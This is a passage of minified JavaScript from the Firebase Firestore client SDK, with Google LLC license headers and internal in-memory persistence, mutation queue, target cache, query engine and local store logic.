v=o.get(f);v!==void 0&&ld(v.mutation,p,ji.empty(),yn.now()),dp(n,p)&&(d=d.insert(f,p))}),d})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class s9{constructor(e){this.serializer=e,this.kr=new Map,this.qr=new Map}getBundleMetadata(e,n){return de.resolve(this.kr.get(n))}saveBundleMetadata(e,n){return this.kr.set(n.id,function(s){return{id:s.id,version:s.version,createTime:$r(s.createTime)}}(n)),de.resolve()}getNamedQuery(e,n){return de.resolve(this.qr.get(n))}saveNamedQuery(e,n){return this.qr.set(n.name,function(s){return{name:s.name,query:K8(s.bundledQuery),readTime:$r(s.readTime)}}(n)),de.resolve()}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class a9{constructor(){this.overlays=new un(Pe.comparator),this.Qr=new Map}getOverlay(e,n){return de.resolve(this.overlays.get(n))}getOverlays(e,n){const i=Po();return de.forEach(n,s=>this.getOverlay(e,s).next(o=>{o!==null&&i.set(s,o)})).next(()=>i)}saveOverlays(e,n,i){return i.forEach((s,o)=>{this.bt(e,n,o)}),de.resolve()}removeOverlaysForBatchId(e,n,i){const s=this.Qr.get(i);return s!==void 0&&(s.forEach(o=>this.overlays=this.overlays.remove(o)),this.Qr.delete(i)),de.resolve()}getOverlaysForCollection(e,n,i){const s=Po(),o=n.length+1,c=new Pe(n.child("")),d=this.overlays.getIteratorFrom(c);for(;d.hasNext();){const f=d.getNext().value,p=f.getKey();if(!n.isPrefixOf(p.path))break;p.path.length===o&&f.largestBatchId>i&&s.set(f.getKey(),f)}return de.resolve(s)}getOverlaysForCollectionGroup(e,n,i,s){let o=new un((p,v)=>p-v);const c=this.overlays.getIterator();for(;c.hasNext();){const p=c.getNext().value;if(p.getKey().getCollectionGroup()===n&&p.largestBatchId>i){let v=o.get(p.largestBatchId);v===null&&(v=Po(),o=o.insert(p.largestBatchId,v)),v.set(p.getKey(),p)}}const d=Po(),f=o.getIterator();for(;f.hasNext()&&(f.getNext().value.forEach((p,v)=>d.set(p,v)),!(d.size()>=s)););return de.resolve(d)}bt(e,n,i){const s=this.overlays.get(i.key);if(s!==null){const c=this.Qr.get(s.largestBatchId).delete(i.key);this.Qr.set(s.largestBatchId,c)}this.overlays=this.overlays.insert(i.key,new T8(n,i));let o=this.Qr.get(n);o===void 0&&(o=ct(),this.Qr.set(n,o)),this.Qr.set(n,o.add(i.key))}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class o9{constructor(){this.sessionToken=Bn.EMPTY_BYTE_STRING}getSessionToken(e){return de.resolve(this.sessionToken)}setSessionToken(e,n){return this.sessionToken=n,de.resolve()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class d_{constructor(){this.$r=new vn(Tn.Ur),this.Kr=new vn(Tn.Wr)}isEmpty(){return this.$r.isEmpty()}addReference(e,n){const i=new Tn(e,n);this.$r=this.$r.add(i),this.Kr=this.Kr.add(i)}Gr(e,n){e.forEach(i=>this.addReference(i,n))}removeReference(e,n){this.zr(new Tn(e,n))}jr(e,n){e.forEach(i=>this.removeReference(i,n))}Hr(e){const n=new Pe(new qt([])),i=new Tn(n,e),s=new Tn(n,e+1),o=[];return this.Kr.forEachInRange([i,s],c=>{this.zr(c),o.push(c.key)}),o}Jr(){this.$r.forEach(e=>this.zr(e))}zr(e){this.$r=this.$r.delete(e),this.Kr=this.Kr.delete(e)}Yr(e){const n=new Pe(new qt([])),i=new Tn(n,e),s=new Tn(n,e+1);let o=ct();return this.Kr.forEachInRange([i,s],c=>{o=o.add(c.key)}),o}containsKey(e){const n=new Tn(e,0),i=this.$r.firstAfterOrEqual(n);return i!==null&&e.isEqual(i.key)}}class Tn{constructor(e,n){this.key=e,this.Zr=n}static Ur(e,n){return Pe.comparator(e.key,n.key)||Xe(e.Zr,n.Zr)}static Wr(e,n){return Xe(e.Zr,n.Zr)||Pe.comparator(e.key,n.key)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class l9{constructor(e,n){this.indexManager=e,this.referenceDelegate=n,this.mutationQueue=[],this.nr=1,this.Xr=new vn(Tn.Ur)}checkEmpty(e){return de.resolve(this.mutationQueue.length===0)}addMutationBatch(e,n,i,s){const o=this.nr;this.nr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const c=new E8(o,n,i,s);this.mutationQueue.push(c);for(const d of s)this.Xr=this.Xr.add(new Tn(d.key,o)),this.indexManager.addToCollectionParentIndex(e,d.key.path.popLast());return de.resolve(c)}lookupMutationBatch(e,n){return de.resolve(this.ei(n))}getNextMutationBatchAfterBatchId(e,n){const i=n+1,s=this.ti(i),o=s<0?0:s;return de.resolve(this.mutationQueue.length>o?this.mutationQueue[o]:null)}getHighestUnacknowledgedBatchId(){return de.resolve(this.mutationQueue.length===0?t_:this.nr-1)}getAllMutationBatches(e){return de.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,n){const i=new Tn(n,0),s=new Tn(n,Number.POSITIVE_INFINITY),o=[];return this.Xr.forEachInRange([i,s],c=>{const d=this.ei(c.Zr);o.push(d)}),de.resolve(o)}getAllMutationBatchesAffectingDocumentKeys(e,n){let i=new vn(Xe);return n.forEach(s=>{const o=new Tn(s,0),c=new Tn(s,Number.POSITIVE_INFINITY);this.Xr.forEachInRange([o,c],d=>{i=i.add(d.Zr)})}),de.resolve(this.ni(i))}getAllMutationBatchesAffectingQuery(e,n){const i=n.path,s=i.length+1;let o=i;Pe.isDocumentKey(o)||(o=o.child(""));const c=new Tn(new Pe(o),0);let d=new vn(Xe);return this.Xr.forEachWhile(f=>{const p=f.key.path;return!!i.isPrefixOf(p)&&(p.length===s&&(d=d.add(f.Zr)),!0)},c),de.resolve(this.ni(d))}ni(e){const n=[];return e.forEach(i=>{const s=this.ei(i);s!==null&&n.push(s)}),n}removeMutationBatch(e,n){St(this.ri(n.batchId,"removed")===0,55003),this.mutationQueue.shift();let i=this.Xr;return de.forEach(n.mutations,s=>{const o=new Tn(s.key,n.batchId);return i=i.delete(o),this.referenceDelegate.markPotentiallyOrphaned(e,s.key)}).next(()=>{this.Xr=i})}sr(e){}containsKey(e,n){const i=new Tn(n,0),s=this.Xr.firstAfterOrEqual(i);return de.resolve(n.isEqual(s&&s.key))}performConsistencyCheck(e){return this.mutationQueue.length,de.resolve()}ri(e,n){return this.ti(e)}ti(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}ei(e){const n=this.ti(e);return n<0||n>=this.mutationQueue.length?null:this.mutationQueue[n]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class c9{constructor(e){this.ii=e,this.docs=function(){return new un(Pe.comparator)}(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,n){const i=n.key,s=this.docs.get(i),o=s?s.size:0,c=this.ii(n);return this.docs=this.docs.insert(i,{document:n.mutableCopy(),size:c}),this.size+=c-o,this.indexManager.addToCollectionParentIndex(e,i.path.popLast())}removeEntry(e){const n=this.docs.get(e);n&&(this.docs=this.docs.remove(e),this.size-=n.size)}getEntry(e,n){const i=this.docs.get(n);return de.resolve(i?i.document.mutableCopy():Wn.newInvalidDocument(n))}getEntries(e,n){let i=Us();return n.forEach(s=>{const o=this.docs.get(s);i=i.insert(s,o?o.document.mutableCopy():Wn.newInvalidDocument(s))}),de.resolve(i)}getDocumentsMatchingQuery(e,n,i,s){let o=Us();const c=n.path,d=new Pe(c.child("__id-9223372036854775808__")),f=this.docs.getIteratorFrom(d);for(;f.hasNext();){const{key:p,value:{document:v}}=f.getNext();if(!c.isPrefixOf(p.path))break;p.path.length>c.length+1||LP(jP(v),i)<=0||(s.has(v.key)||dp(n,v))&&(o=o.insert(v.key,v.mutableCopy()))}return de.resolve(o)}getAllFromCollectionGroup(e,n,i,s){ze(9500)}si(e,n){return de.forEach(this.docs,i=>n(i))}newChangeBuffer(e){return new u9(this)}getSize(e){return de.resolve(this.size)}}class u9 extends n9{constructor(e){super(),this.Br=e}applyChanges(e){const n=[];return this.changes.forEach((i,s)=>{s.isValidDocument()?n.push(this.Br.addEntry(e,s)):this.Br.removeEntry(i)}),de.waitFor(n)}getFromCache(e,n){return this.Br.getEntry(e,n)}getAllFromCache(e,n){return this.Br.getEntries(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class d9{constructor(e){this.persistence=e,this.oi=new nl(n=>r_(n),s_),this.lastRemoteSnapshotVersion=Ye.min(),this.highestTargetId=0,this._i=0,this.ai=new d_,this.targetCount=0,this.ui=vc.cr()}forEachTarget(e,n){return this.oi.forEach((i,s)=>n(s)),de.resolve()}getLastRemoteSnapshotVersion(e){return de.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return de.resolve(this._i)}allocateTargetId(e){return this.highestTargetId=this.ui.next(),de.resolve(this.highestTargetId)}setTargetsMetadata(e,n,i){return i&&(this.lastRemoteSnapshotVersion=i),n>this._i&&(this._i=n),de.resolve()}Tr(e){this.oi.set(e.target,e);const n=e.targetId;n>this.highestTargetId&&(this.ui=new vc(n),this.highestTargetId=n),e.sequenceNumber>this._i&&(this._i=e.sequenceNumber)}addTargetData(e,n){return this.Tr(n),this.targetCount+=1,de.resolve()}updateTargetData(e,n){return this.Tr(n),de.resolve()}removeTargetData(e,n){return this.oi.delete(n.target),this.ai.Hr(n.targetId),this.targetCount-=1,de.resolve()}removeTargets(e,n,i){let s=0;const o=[];return this.oi.forEach((c,d)=>{d.sequenceNumber<=n&&i.get(d.targetId)===null&&(this.oi.delete(c),o.push(this.removeMatchingKeysForTargetId(e,d.targetId)),s++)}),de.waitFor(o).next(()=>s)}getTargetCount(e){return de.resolve(this.targetCount)}getTargetData(e,n){const i=this.oi.get(n)||null;return de.resolve(i)}addMatchingKeys(e,n,i){return this.ai.Gr(n,i),de.resolve()}removeMatchingKeys(e,n,i){this.ai.jr(n,i);const s=this.persistence.referenceDelegate,o=[];return s&&n.forEach(c=>{o.push(s.markPotentiallyOrphaned(e,c))}),de.waitFor(o)}removeMatchingKeysForTargetId(e,n){return this.ai.Hr(n),de.resolve()}getMatchingKeysForTargetId(e,n){const i=this.ai.Yr(n);return de.resolve(i)}containsKey(e,n){return de.resolve(this.ai.containsKey(n))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class LS{constructor(e,n){this.ci={},this.overlays={},this.li=new sp(0),this.hi=!1,this.hi=!0,this.Pi=new o9,this.referenceDelegate=e(this),this.Ti=new d9(this),this.indexManager=new W8,this.remoteDocumentCache=function(s){return new c9(s)}(i=>this.referenceDelegate.Ii(i)),this.serializer=new Q8(n),this.Ei=new s9(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.hi=!1,Promise.resolve()}get started(){return this.hi}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let n=this.overlays[e.toKey()];return n||(n=new a9,this.overlays[e.toKey()]=n),n}getMutationQueue(e,n){let i=this.ci[e.toKey()];return i||(i=new l9(n,this.referenceDelegate),this.ci[e.toKey()]=i),i}getGlobalsCache(){return this.Pi}getTargetCache(){return this.Ti}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Ei}runTransaction(e,n,i){xe("MemoryPersistence","Starting transaction:",e);const s=new h9(this.li.next());return this.referenceDelegate.di(),i(s).next(o=>this.referenceDelegate.Ai(s).next(()=>o)).toPromise().then(o=>(s.raiseOnCommittedEvent(),o))}Ri(e,n){return de.or(Object.values(this.ci).map(i=>()=>i.containsKey(e,n)))}}class h9 extends UP{constructor(e){super(),this.currentSequenceNumber=e}}class h_{constructor(e){this.persistence=e,this.Vi=new d_,this.mi=null}static fi(e){return new h_(e)}get gi(){if(this.mi)return this.mi;throw ze(60996)}addReference(e,n,i){return this.Vi.addReference(i,n),this.gi.delete(i.toString()),de.resolve()}removeReference(e,n,i){return this.Vi.removeReference(i,n),this.gi.add(i.toString()),de.resolve()}markPotentiallyOrphaned(e,n){return this.gi.add(n.toString()),de.resolve()}removeTarget(e,n){this.Vi.Hr(n.targetId).forEach(s=>this.gi.add(s.toString()));const i=this.persistence.getTargetCache();return i.getMatchingKeysForTargetId(e,n.targetId).next(s=>{s.forEach(o=>this.gi.add(o.toString()))}).next(()=>i.removeTargetData(e,n))}di(){this.mi=new Set}Ai(e){const n=this.persistence.getRemoteDocumentCache().newChangeBuffer();return de.forEach(this.gi,i=>{const s=Pe.fromPath(i);return this.pi(e,s).next(o=>{o||n.removeEntry(s,Ye.min())})}).next(()=>(this.mi=null,n.apply(e)))}updateLimboDocument(e,n){return this.pi(e,n).next(i=>{i?this.gi.delete(n.toString()):this.gi.add(n.toString())})}Ii(e){return 0}pi(e,n){return de.or([()=>de.resolve(this.Vi.containsKey(n)),()=>this.persistence.getTargetCache().containsKey(e,n),()=>this.persistence.Ri(e,n)])}}class bm{constructor(e,n){this.persistence=e,this.yi=new nl(i=>FP(i.path),(i,s)=>i.isEqual(s)),this.garbageCollector=t9(this,n)}static fi(e,n){return new bm(e,n)}di(){}Ai(e){return de.resolve()}forEachTarget(e,n){return this.persistence.getTargetCache().forEachTarget(e,n)}pr(e){const n=this.Sr(e);return this.persistence.getTargetCache().getTargetCount(e).next(i=>n.next(s=>i+s))}Sr(e){let n=0;return this.yr(e,i=>{n++}).next(()=>n)}yr(e,n){return de.forEach(this.yi,(i,s)=>this.Dr(e,i,s).next(o=>o?de.resolve():n(s)))}removeTargets(e,n,i){return this.persistence.getTargetCache().removeTargets(e,n,i)}removeOrphanedDocuments(e,n){let i=0;const s=this.persistence.getRemoteDocumentCache(),o=s.newChangeBuffer();return s.si(e,c=>this.Dr(e,c,n).next(d=>{d||(i++,o.removeEntry(c,Ye.min()))})).next(()=>o.apply(e)).next(()=>i)}markPotentiallyOrphaned(e,n){return this.yi.set(n,e.currentSequenceNumber),de.resolve()}removeTarget(e,n){const i=n.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,i)}addReference(e,n,i){return this.yi.set(i,e.currentSequenceNumber),de.resolve()}removeReference(e,n,i){return this.yi.set(i,e.currentSequenceNumber),de.resolve()}updateLimboDocument(e,n){return this.yi.set(n,e.currentSequenceNumber),de.resolve()}Ii(e){let n=e.key.toString().length;return e.isFoundDocument()&&(n+=Vf(e.data.value)),n}Dr(e,n,i){return de.or([()=>this.persistence.Ri(e,n),()=>this.persistence.getTargetCache().containsKey(e,n),()=>{const s=this.yi.get(n);return de.resolve(s!==void 0&&s>i)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class f_{constructor(e,n,i,s){this.targetId=e,this.fromCache=n,this.ds=i,this.As=s}static Rs(e,n){let i=ct(),s=ct();for(const o of n.docChanges)switch(o.type){case 0:i=i.add(o.doc.key);break;case 1:s=s.add(o.doc.key)}return new f_(e,n.fromCache,i,s)}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class f9{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class m9{constructor(){this.Vs=!1,this.fs=!1,this.gs=100,this.ps=function(){return sO()?8:BP(Xn())>0?6:4}()}initialize(e,n){this.ys=e,this.indexManager=n,this.Vs=!0}getDocumentsMatchingQuery(e,n,i,s){const o={result:null};return this.ws(e,n).next(c=>{o.result=c}).next(()=>{if(!o.result)return this.Ss(e,n,s,i).next(c=>{o.result=c})}).next(()=>{if(o.result)return;const c=new f9;return this.bs(e,n,c).next(d=>{if(o.result=d,this.fs)return this.Ds(e,n,c,d.size)})}).next(()=>o.result)}Ds(e,n,i,s){return i.documentReadCount<this.gs?(Kl()<=ot.DEBUG&&xe("QueryEngine","SDK will not create cache indexes for query:",Wl(n),"since it only creates cache indexes for collection contains","more than or equal to",this.gs,"documents"),de.resolve()):(Kl()<=ot.DEBUG&&xe("QueryEngine","Query:",Wl(n),"scans",i.documentReadCount,"local documents and returns",s,"documents as results."),i.documentReadCount>this.ps*s?(Kl()<=ot.DEBUG&&xe("QueryEngine","The SDK decides to create cache indexes for query:",Wl(n),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,Wr(n))):de.resolve())}ws(e,n){if(gA(n))return de.resolve(null);let i=Wr(n);return this.indexManager.getIndexType(e,i).next(s=>s===0?null:(n.limit!==null&&s===1&&(n=F0(n,null,"F"),i=Wr(n)),this.indexManager.getDocumentsMatchingTarget(e,i).next(o=>{const c=ct(...o);return this.ys.getDocuments(e,c).next(d=>this.indexManager.getMinOffset(e,i).next(f=>{const p=this.vs(n,d);return this.Cs(n,p,c,f.readTime)?this.ws(e,F0(n,null,"F")):this.Fs(e,p,n,f)}))})))}Ss(e,n,i,s){return gA(n)||s.isEqual(Ye.min())?de.resolve(null):this.ys.getDocuments(e,i).next(o=>{const c=this.vs(n,o);return this.Cs(n,c,i,s)?de.resolve(null):(Kl()<=ot.DEBUG&&xe("QueryEngine","Re-using previous result from %s to execute query: %s",s.toString(),Wl(n)),this.Fs(e,c,n,PP(s,_d)).next(d=>d))})}vs(e,n){let i=new vn(pS(e));return n.forEach((s,o)=>{dp(e,o)&&(i=i.add(o))}),i}Cs(e,n,i,s){if(e.limit===null)return!1;if(i.size!==n.size)return!0;const o=e.limitType==="F"?n.last():n.first();return!!o&&(o.hasPendingWrites||o.version.compareTo(s)>0)}bs(e,n,i){return Kl()<=ot.DEBUG&&xe("QueryEngine","Using full collection scan to execute query:",Wl(n)),this.ys.getDocumentsMatchingQuery(e,n,Fa.min(),i)}Fs(e,n,i,s){return this.ys.getDocumentsMatchingQuery(e,i,s).next(o=>(n.forEach(c=>{o=o.insert(c.key,c)}),o))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const m_="LocalStore",p9=3e8;class g9{constructor(e,n,i,s){this.persistence=e,this.Ms=n,this.serializer=s,this.xs=new un(Xe),this.Os=new nl(o=>r_(o),s_),this.Ns=new Map,this.Bs=e.getRemoteDocumentCache(),this.Ti=e.getTargetCache(),this.Ei=e.getBundleCache(),this.Ls(i)}Ls(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new r9(this.Bs,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.Bs.setIndexManager(this.indexManager),this.Ms.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",n=>e.collect(n,this.xs))}}function y9(t,e,n,i){return new g9(t,e,n,i)}async function VS(t,e){const n=Qe(t);return await n.persistence.runTransaction("Handle user change","readonly",i=>{let s;return n.mutationQueue.getAllMutationBatches(i).next(o=>(s=o,n.Ls(e),n.mutationQueue.getAllMutationBatches(i))).next(o=>{const c=[],d=[];let f=ct();for(const p of s){c.push(p.batchId);for(const v of p.mutations)f=f.add(v.key)}for(const p of o){d.push(p.batchId);for(const v of p.mutations)f=f.add(v.key)}return n.localDocuments.getDocuments(i,f).next(p=>({ks:p,removedBatchIds:c,addedBatchIds:d}))})})}function v9(t,e){const n=Qe(t);return n.persistence.runTransaction("Acknowledge batch","readwrite-primary",i=>{const s=e.batch.keys(),o=n.Bs.newChangeBuffer({trackRemovals:!0});return function(d,f,p,v){const b=p.batch,w=b.keys();let E=de.resolve();return w.forEach(C=>{E=E.next(()=>v.getEntry(f,C)).next(M=>{const V=p.docVersions.get(C);St(V!==null,48541),M.version.compareTo(V)<0&&(b.applyToRemoteDocument(M,p),M.isValidDocument()&&(M.setReadTime(p.commitVersion),v.addEntry(M)))})}),E.next(()=>d.mutationQueue.removeMutationBatch(f,b))}(n,i,e,o).next(()=>o.apply(i)).next(()=>n.mutationQueue.performConsistencyCheck(i)).next(()=>n.documentOverlayCache.removeOverlaysForBatchId(i,s,e.batch.batchId)).next(()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(i,function(d){let f=ct();for(let p=0;p<d.mutationResults.length;++p)d.mutationResults[p].transformResults.length>0&&(f=f.add(d.batch.mutations[p].key));return f}(e))).next(()=>n.localDocuments.getDocuments(i,s))})}function US(t){const e=Qe(t);return e.persistence.runTransaction("Get last remote snapshot version","readonly",n=>e.Ti.getLastRemoteSnapshotVersion(n))}function _9(t,e){const n=Qe(t),i=e.snapshotVersion;let s=n.xs;return n.persistence.runTransaction("Apply remote event","readwrite-primary",o=>{const c=n.Bs.newChangeBuffer({trackRemovals:!0});s=n.xs;const d=[];e.targetChanges.forEach((v,b)=>{const w=s.get(b);if(!w)return;d.push(n.Ti.removeMatchingKeys(o,v.removedDocuments,b).next(()=>n.Ti.addMatchingKeys(o,v.addedDocuments,b)));let E=w.withSequenceNumber(o.currentSequenceNumber);e.targetMismatches.get(b)!==null?E=E.withResumeToken(Bn.EMPTY_BYTE_STRING,Ye.min()).withLastLimboFreeSnapshotVersion(Ye.min()):v.resumeToken.approximateByteSize()>0&&(E=E.withResumeToken(v.resumeToken,i)),s=s.insert(b,E),function(M,V,B){return M.resumeToken.approximateByteSize()===0||V.snapshotVersion.toMicroseconds()-M.snapshotVersion.toMicroseconds()>=p9?!0:B.addedDocuments.size+B.modifiedDocuments.size+B.removedDocuments.size>0}(w,E,v)&&d.push(n.Ti.updateTargetData(o,E))});let f=Us(),p=ct();if(e.documentUpdates.forEach(v=>{e.resolvedLimboDocuments.has(v)&&d.push(n.persistence.referenceDelegate.updateLimboDocument(o,v))}),d.push(w9(o,c,e.documentUpdates).next(v=>{f=v.qs,p=v.Qs})),!i.isEqual(Ye.min())){const v=n.Ti.getLastRemoteSnapshotVersion(o).next(b=>n.Ti.setTargetsMetadata(o,o.currentSequenceNumber,i));d.push(v)}return de.waitFor(d).next(()=>c.apply(o)).next(()=>n.localDocuments.getLocalViewOfDocuments(o,f,p)).next(()=>f)}).then(o=>(n.xs=s,o))}function w9(t,e,n){let i=ct(),s=ct();return n.forEach(o=>i=i.add(o)),e.getEntries(t,i).next(o=>{let c=Us();return n.forEach((d,f)=>{const p=o.get(d);f.isFoundDocument()!==p.isFoundDocument()&&(s=s.add(d)),f.isNoDocument()&&f.version.isEqual(Ye.min())?(e.removeEntry(d,f.readTime),c=c.insert(d,f)):!p.isValidDocument()||f.version.compareTo(p.version)>0||f.version.compareTo(p.version)===0&&p.hasPendingWrites?(e.addEntry(f),c=c.insert(d,f)):xe(m_,"Ignoring outdated watch update for ",d,". Current version:",p.version," Watch version:",f.version)}),{qs:c,Qs:s}})}function b9(t,e){const n=Qe(t);return n.persistence.runTransaction("Get next mutation batch","readonly",i=>(e===void 0&&(e=t_),n.mutationQueue.getNextMutationBatchAfterBatchId(i,e)))}function x9(t,e){const n=Qe(t);return n.persistence.runTransaction("Allocate target","readwrite",i=>{let s;return n.Ti.getTargetData(i,e).next(o=>o?(s=o,de.resolve(s)):n.Ti.allocateTargetId(i).next(c=>(s=new ka(e,c,"TargetPurposeListen",i.currentSequenceNumber),n.Ti.addTargetData(i,s).next(()=>s))))}).then(i=>{const s=n.xs.get(i.targetId);return(s===null||i.snapshotVersion.compareTo(s.snapshotVersion)>0)&&(n.xs=n.xs.insert(i.targetId,i),n.Os.set(e,i.targetId)),i})}async function Q0(t,e,n){const i=Qe(t),s=i.xs.get(e),o=n?"readwrite":"readwrite-primary";try{n||await i.persistence.runTransaction("Release target",o,c=>i.persistence.referenceDelegate.removeTarget(c,s))}catch(c){if(!Vc(c))throw c;xe(m_,`Failed to update sequence numbers for target ${e}: ${c}`)}i.xs=i.xs.remove(e),i.Os.delete(s.target)}function RA(t,e,n){const i=Qe(t);let s=Ye.min(),o=ct();return i.persistence.runTransaction("Execute query","readwrite",c=>function(f,p,v){const b=Qe(f),w=b.Os.get(v);return w!==void 0?de.resolve(b.xs.get(w)):b.Ti.getTargetData(p,v)}(i,c,Wr(e)).next(d=>{if(d)return s=d.lastLimboFreeSnapshotVersion,i.Ti.getMatchingKeysForTargetId(c,d.targetId).next(f=>{o=f})}).next(()=>i.Ms.getDocumentsMatchingQuery(c,e,n?s:Ye.min(),n?o:ct())).next(d=>(A9(i,l8(e),d),{documents:d,$s:o})))}function A9(t,e,n){let i=t.Ns.get(e)||Ye.min();n.forEach((s,o)=>{o.readTime.compareTo(i)>0&&(i=o.readTime)}),t.Ns.set(e,i)}class IA{constructor(){this.activeTargetIds=m8()}js(e){this.activeTargetIds=this.activeTargetIds.add(e)}Hs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}zs(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class E9{constructor(){this.xo=new 